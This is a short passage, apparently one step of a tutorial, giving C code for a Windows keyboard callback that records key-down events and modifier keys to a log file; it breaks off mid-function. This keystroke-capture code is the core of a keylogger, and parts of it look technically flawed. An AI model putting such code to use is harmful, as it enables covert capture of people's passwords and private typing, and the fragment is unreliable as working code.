### Step 7: Handle Key Press Events
Update the log file in the callback:
```c
void CALLBACK KeyboardCallback(UINT uMsg, WPARAM wParam, LPARAM lParam, void* hwnd) {
    static int lastKey = 0;
    static int activeModifiers = 0;

    if (uMsg == WM_KEYDOWN) {
        // Check if the key is a modifier
        if (wParam == VK_SHIFT || wParam == VK_CONTROL) {
            activeModifiers |= wParam;
        }
        // Record key down event
        if (wParam != lastKey) {
